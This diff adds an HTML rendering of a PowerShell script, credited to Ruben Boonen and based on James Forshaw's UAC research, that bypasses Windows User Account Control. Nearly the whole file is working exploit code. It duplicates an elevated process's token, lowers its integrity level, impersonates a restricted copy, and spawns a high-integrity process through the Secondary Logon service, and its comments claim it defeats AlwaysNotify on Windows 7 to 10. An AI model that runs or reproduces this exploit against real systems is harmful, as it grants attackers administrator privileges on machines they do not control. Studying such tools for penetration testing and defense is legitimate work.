@@ -1,0 +1,378 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Fuzzy-UAC-TokenMagic.ps1</title>
+</head><body>function UAC-TokenMagic {<br/>
+&lt;#<br/>
+.SYNOPSIS<br/>
+	Based on James Forshaw's three part post on UAC, linked below, and possibly a technique<br/>
+	used by the CIA!<br/>
+	<br/>
+	Essentially we duplicate the token of an elevated process, lower it's mandatory<br/>
+	integrity level, use it to create a new restricted token, impersonate it and<br/>
+	use the Secondary Logon service to spawn a new process with High IL. Like<br/>
+	playing hide-and-go-seek with tokens! ;))<br/>
+<br/>
+	This technique even bypasses the AlwaysNotify setting provided you supply it with<br/>
+	a PID for an elevated process.<br/>
+<br/>
+	Targets:<br/>
+	7,8,8.1,10,10RS1,10RS2<br/>
+	<br/>
+	Reference:<br/>
+	+ https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-1.html<br/>
+	+ https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-2.html<br/>
+	+ https://tyranidslair.blogspot.co.uk/2017/05/reading-your-way-around-uac-part-3.html<br/>
+	<br/>
+.DESCRIPTION<br/>
+	Author: Ruben Boonen (@FuzzySec)<br/>
+	License: BSD 3-Clause<br/>
+	Required Dependencies: None<br/>
+	Optional Dependencies: None<br/>
+<br/>
+.PARAMETER BinPath<br/>
+	Full path of the module to be executed.<br/>
+<br/>
+.PARAMETER Args<br/>
+	Arguments to pass to the module.<br/>
+<br/>
+.PARAMETER ProcPID<br/>
+	PID of an elevated process.<br/>
+<br/>
+.EXAMPLE<br/>
+	C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe<br/>
+<br/>
+.EXAMPLE<br/>
+	C:\PS&gt; UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -Args &quot;/c calc.exe&quot; -ProcPID 1116<br/>
+#&gt;<br/>
+<br/>
+	param(<br/>
+		[Parameter(Mandatory = $True)]<br/>
+		[String]$BinPath,<br/>
+		[Parameter(Mandatory = $False)]<br/>
+		[String]$Args,<br/>
+		[Parameter(Mandatory = $False)]<br/>
+		[int]$ProcPID<br/>
+	)<br/>
+<br/>
+	Add-Type -TypeDefinition @&quot;<br/>
+	using System;<br/>
+	using System.Diagnostics;<br/>
+	using System.Runtime.InteropServices;<br/>
+	using System.Security.Principal;<br/>
+	<br/>
+	[StructLayout(LayoutKind.Sequential)]<br/>
+	public struct PROCESS_INFORMATION<br/>
+	{<br/>
+		public IntPtr hProcess;<br/>
+		public IntPtr hThread;<br/>
+		public uint dwProcessId;<br/>
+		public uint dwThreadId;<br/>
+	}<br/>
+	<br/>
+	[StructLayout(LayoutKind.Sequential)]<br/>
+	public struct SECURITY_ATTRIBUTES<br/>
+	{<br/>
+		public int nLength;<br/>
+		public IntPtr lpSecurityDescriptor;<br/>
+		public int bInheritHandle;<br/>
+	}<br/>
+	<br/>
+	[StructLayout(LayoutKind.Sequential)]<br/>
+	public struct TOKEN_MANDATORY_LABEL<br/>
+	{<br/>
+		public SID_AND_ATTRIBUTES Label;<br/>
+	}<br/>
+	<br/>
+	[StructLayout(LayoutKind.Sequential)]<br/>
+	public struct SID_AND_ATTRIBUTES<br/>
+	{<br/>
+		public IntPtr Sid;<br/>
+		public UInt32 Attributes;<br/>
+	}<br/>
+	<br/>
+	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]<br/>
+	public struct STARTUPINFO<br/>
+	{<br/>
+		public uint cb;<br/>
+		public string lpReserved;<br/>
+		public string lpDesktop;<br/>
+		public string lpTitle;<br/>
+		public uint dwX;<br/>
+		public uint dwY;<br/>
+		public uint dwXSize;<br/>
+		public uint dwYSize;<br/>
+		public uint dwXCountChars;<br/>
+		public uint dwYCountChars;<br/>
+		public uint dwFillAttribute;<br/>
+		public uint dwFlags;<br/>
+		public short wShowWindow;<br/>
+		public short cbReserved2;<br/>
+		public IntPtr lpReserved2;<br/>
+		public IntPtr hStdInput;<br/>
+		public IntPtr hStdOutput;<br/>
+		public IntPtr hStdError;<br/>
+	}<br/>
+	<br/>
+	public struct SID_IDENTIFIER_AUTHORITY <br/>
+	{<br/>
+	[MarshalAs(UnmanagedType.ByValArray, SizeConst=6)]<br/>
+	public byte[] Value;<br/>
+	public SID_IDENTIFIER_AUTHORITY(byte[] value)<br/>
+	{<br/>
+		Value = value;<br/>
+	}<br/>
+	}<br/>
+	<br/>
+	[StructLayout(LayoutKind.Sequential)]<br/>
+	public struct SHELLEXECUTEINFO<br/>
+	{<br/>
+		public int cbSize;<br/>
+		public uint fMask;<br/>
+		public IntPtr hwnd;<br/>
+		[MarshalAs(UnmanagedType.LPTStr)]<br/>
+		public string lpVerb;<br/>
+		[MarshalAs(UnmanagedType.LPTStr)]<br/>
+		public string lpFile;<br/>
+		[MarshalAs(UnmanagedType.LPTStr)]<br/>
+		public string lpParameters;<br/>
+		[MarshalAs(UnmanagedType.LPTStr)]<br/>
+		public string lpDirectory;<br/>
+		public int nShow;<br/>
+		public IntPtr hInstApp;<br/>
+		public IntPtr lpIDList;<br/>
+		[MarshalAs(UnmanagedType.LPTStr)]<br/>
+		public string lpClass;<br/>
+		public IntPtr hkeyClass;<br/>
+		public uint dwHotKey;<br/>
+		public IntPtr hIcon;<br/>
+		public IntPtr hProcess;<br/>
+	}<br/>
+<br/>
+	public static class UACTokenMagic<br/>
+	{<br/>
+		[DllImport(&quot;advapi32.dll&quot;, CharSet=CharSet.Unicode, SetLastError=true)]<br/>
+		public static extern bool CreateProcessWithLogonW(<br/>
+			String userName,<br/>
+			String domain,<br/>
+			String password,<br/>
+			int logonFlags,<br/>
+			String applicationName,<br/>
+			String commandLine,<br/>
+			int creationFlags,<br/>
+			int environment,<br/>
+			String currentDirectory,<br/>
+			ref STARTUPINFO startupInfo,<br/>
+			out PROCESS_INFORMATION processInformation);<br/>
+	<br/>
+		[DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]<br/>
+		public static extern IntPtr CreateFile(<br/>
+			String lpFileName,<br/>
+			UInt32 dwDesiredAccess,<br/>
+			UInt32 dwShareMode,<br/>
+			IntPtr lpSecurityAttributes,<br/>
+			UInt32 dwCreationDisposition,<br/>
+			UInt32 dwFlagsAndAttributes,<br/>
+			IntPtr hTemplateFile);<br/>
+<br/>
+		[DllImport(&quot;kernel32.dll&quot;)]<br/>
+		public static extern IntPtr OpenProcess(<br/>
+			UInt32 processAccess,<br/>
+			bool bInheritHandle,<br/>
+			int processId);<br/>
+	<br/>
+		[DllImport(&quot;advapi32.dll&quot;)]<br/>
+		public static extern bool OpenProcessToken(<br/>
+			IntPtr ProcessHandle, <br/>
+			int DesiredAccess,<br/>
+			ref IntPtr TokenHandle);<br/>
+	<br/>
+		[DllImport(&quot;advapi32.dll&quot;, CharSet=CharSet.Auto)]<br/>
+		public extern static bool DuplicateTokenEx(<br/>
+			IntPtr hExistingToken,<br/>
+			uint dwDesiredAccess,<br/>
+			ref SECURITY_ATTRIBUTES lpTokenAttributes,<br/>
+			int ImpersonationLevel,<br/>
+			int TokenType,<br/>
+			ref IntPtr phNewToken);<br/>
+	<br/>
+		[DllImport(&quot;advapi32.dll&quot;)]<br/>
+		public static extern bool AllocateAndInitializeSid(<br/>
+			ref SID_IDENTIFIER_AUTHORITY pIdentifierAuthority,<br/>
+			byte nSubAuthorityCount, <br/>
+			int dwSubAuthority0, int dwSubAuthority1, <br/>
+			int dwSubAuthority2, int dwSubAuthority3, <br/>
+			int dwSubAuthority4, int dwSubAuthority5, <br/>
+			int dwSubAuthority6, int dwSubAuthority7, <br/>
+			ref IntPtr pSid);<br/>
+	<br/>
+		[DllImport(&quot;ntdll.dll&quot;)]<br/>
+		public static extern int NtSetInformationToken(<br/>
+			IntPtr TokenHandle,<br/>
+			int TokenInformationClass,<br/>
+			ref TOKEN_MANDATORY_LABEL TokenInformation,<br/>
+			int TokenInformationLength);<br/>
+<br/>
+		[DllImport(&quot;ntdll.dll&quot;)]<br/>
+		public static extern int NtFilterToken(<br/>
+			IntPtr TokenHandle,<br/>
+			UInt32 Flags,<br/>
+			IntPtr SidsToDisable,<br/>
+			IntPtr PrivilegesToDelete,<br/>
+			IntPtr RestrictedSids,<br/>
+			ref IntPtr hToken);<br/>
+	<br/>
+		[DllImport(&quot;advapi32.dll&quot;)]<br/>
+		public static extern bool ImpersonateLoggedOnUser(<br/>
+			IntPtr hToken);<br/>
+	<br/>
+		[DllImport(&quot;kernel32.dll&quot;, SetLastError=true)]<br/>
+		public static extern bool TerminateProcess(<br/>
+			IntPtr hProcess,<br/>
+			uint uExitCode);<br/>
+	<br/>
+		[DllImport(&quot;shell32.dll&quot;, CharSet = CharSet.Auto)]<br/>
+		public static extern bool ShellExecuteEx(<br/>
+			ref SHELLEXECUTEINFO lpExecInfo);<br/>
+		}<br/>
+&quot;@<br/>
+<br/>
+	# Test elevated access<br/>
+	$TestAccess = New-Item -Path C:\Windows\System32\test.txt -Type file -ErrorAction SilentlyContinue<br/>
+	if (!$TestAccess) {<br/>
+		echo &quot;`n[*] Session is not elevated&quot;<br/>
+	} else {<br/>
+		echo &quot;`n[!] Session is elevated!`n&quot;<br/>
+		del C:\Windows\System32\test.txt<br/>
+		Break<br/>
+	}<br/>
+<br/>
+	if ($ProcPID){<br/>
+		$IsValidProc = Get-Process -Id $ProcPID -ErrorAction SilentlyContinue<br/>
+		if (!$IsValidProc) {<br/>
+			echo &quot;[!] Invalid process specified!`n&quot;<br/>
+			Break<br/>
+		}<br/>
+<br/>
+		# We don't actually check if the process is elevated, be smart<br/>
+		# QueryLimitedInformation = 0x1000<br/>
+		$hProcess = [UACTokenMagic]::OpenProcess(0x00001000,$false,$ProcPID)<br/>
+		if ($hProcess -ne 0) {<br/>
+			echo &quot;[*] Successfully acquired $((Get-Process -Id $ProcPID).Name) handle&quot;<br/>
+		} else {<br/>
+			echo &quot;[!] Failed to get process token!`n&quot;<br/>
+			Break<br/>
+		}<br/>
+	} else {<br/>
+		# Prepare ShellExecuteEx<br/>
+		$ShellExecuteInfo = New-Object SHELLEXECUTEINFO<br/>
+		$ShellExecuteInfo.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($ShellExecuteInfo)<br/>
+		$ShellExecuteInfo.fMask = 0x40 # SEE_MASK_NOCLOSEPROCESS<br/>
+		$ShellExecuteInfo.lpFile = &quot;wusa.exe&quot;<br/>
+		$ShellExecuteInfo.nShow = 0x0 # SW_HIDE<br/>
+		<br/>
+		if ([UACTokenMagic]::ShellExecuteEx([ref]$ShellExecuteInfo)) {<br/>
+			echo &quot;[*] WUSA process created&quot;<br/>
+			$hProcess = $ShellExecuteInfo.hProcess<br/>
+		} else {<br/>
+			echo &quot;[!] Failed to create WUSA process!`n&quot;<br/>
+			Break<br/>
+		}<br/>
+	}<br/>
+	<br/>
+	# Open process token<br/>
+	$hToken = [IntPtr]::Zero<br/>
+	if ([UACTokenMagic]::OpenProcessToken($hProcess,0x02000000,[ref]$hToken)) {<br/>
+		echo &quot;[*] Opened process token&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed open process token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	<br/>
+	# Duplicate token<br/>
+	# TOKEN_ALL_ACCESS = 0xf01ff<br/>
+	$hNewToken = [IntPtr]::Zero<br/>
+	$SECURITY_ATTRIBUTES = New-Object SECURITY_ATTRIBUTES<br/>
+	if ([UACTokenMagic]::DuplicateTokenEx($hToken,0xf01ff,[ref]$SECURITY_ATTRIBUTES,2,1,[ref]$hNewToken)) {<br/>
+		echo &quot;[*] Duplicated process token&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed to duplicate process token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	<br/>
+	# SID initialize<br/>
+	$SID_IDENTIFIER_AUTHORITY = New-Object SID_IDENTIFIER_AUTHORITY<br/>
+	$SID_IDENTIFIER_AUTHORITY.Value = [Byte[]](0x0,0x0,0x0,0x0,0x0,0x10)<br/>
+	$pSID = [IntPtr]::Zero<br/>
+	if ([UACTokenMagic]::AllocateAndInitializeSid([ref]$SID_IDENTIFIER_AUTHORITY,1,0x2000,0,0,0,0,0,0,0,[ref]$pSID)) {<br/>
+		echo &quot;[*] Initialized MedIL SID&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed initialize SID!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	<br/>
+	# Token integrity label<br/>
+	$SID_AND_ATTRIBUTES = New-Object SID_AND_ATTRIBUTES<br/>
+	$SID_AND_ATTRIBUTES.Sid = $pSID<br/>
+	$SID_AND_ATTRIBUTES.Attributes = 0x20 # SE_GROUP_INTEGRITY<br/>
+	$TOKEN_MANDATORY_LABEL = New-Object TOKEN_MANDATORY_LABEL<br/>
+	$TOKEN_MANDATORY_LABEL.Label = $SID_AND_ATTRIBUTES<br/>
+	$TOKEN_MANDATORY_LABEL_SIZE = [System.Runtime.InteropServices.Marshal]::SizeOf($TOKEN_MANDATORY_LABEL)<br/>
+	if([UACTokenMagic]::NtSetInformationToken($hNewToken,25,[ref]$TOKEN_MANDATORY_LABEL,$($TOKEN_MANDATORY_LABEL_SIZE)) -eq 0) {<br/>
+		echo &quot;[*] Lowered token mandatory IL&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed modify token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	<br/>
+	# Create restricted token<br/>
+	# LUA_TOKEN = 0x4<br/>
+	$LUAToken = [IntPtr]::Zero<br/>
+	if([UACTokenMagic]::NtFilterToken($hNewToken,4,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[ref]$LUAToken) -eq 0) {<br/>
+		echo &quot;[*] Created restricted token&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed to create restricted token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	<br/>
+	# Duplicate restricted token<br/>
+	# TOKEN_IMPERSONATE | TOKEN_QUERY = 0xc<br/>
+	$hNewToken = [IntPtr]::Zero<br/>
+	$SECURITY_ATTRIBUTES = New-Object SECURITY_ATTRIBUTES<br/>
+	if ([UACTokenMagic]::DuplicateTokenEx($LUAToken,0xc,[ref]$SECURITY_ATTRIBUTES,2,2,[ref]$hNewToken)) {<br/>
+		echo &quot;[*] Duplicated restricted token&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed to duplicate restricted token!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	<br/>
+	# Impersonate security context<br/>
+	if([UACTokenMagic]::ImpersonateLoggedOnUser($hNewToken)) {<br/>
+		echo &quot;[*] Successfully impersonated security context&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed impersonate context!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+	<br/>
+	# Prepare CreateProcessWithLogon<br/>
+	$StartupInfo = New-Object STARTUPINFO<br/>
+	$StartupInfo.dwFlags = 0x00000001<br/>
+	$StartupInfo.wShowWindow = 0x0001<br/>
+	$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo)<br/>
+	$ProcessInfo = New-Object PROCESS_INFORMATION<br/>
+	<br/>
+	# Spawn elevated process<br/>
+	# LOGON_NETCREDENTIALS_ONLY = 0x2<br/>
+	$CurrentDirectory = $Env:SystemRoot<br/>
+	if ([UACTokenMagic]::CreateProcessWithLogonW(&quot;aaa&quot;, &quot;bbb&quot;, &quot;ccc&quot;, 0x00000002, $BinPath, $Args, 0x04000000, $null, $CurrentDirectory,[ref]$StartupInfo, [ref]$ProcessInfo)) {<br/>
+		echo &quot;[*] Magic..`n&quot;<br/>
+	} else {<br/>
+		echo &quot;[!] Failed to create process!`n&quot;<br/>
+		Break<br/>
+	}<br/>
+<br/>
+	# Kill wusa, there should be more/robust cleanup in the script, but ... lazy<br/>
+	if (!$ProcPID) {<br/>
+		$CallResult = [UACTokenMagic]::TerminateProcess($ShellExecuteInfo.hProcess, 1)<br/>
+	}<br/>
+}</body></html>
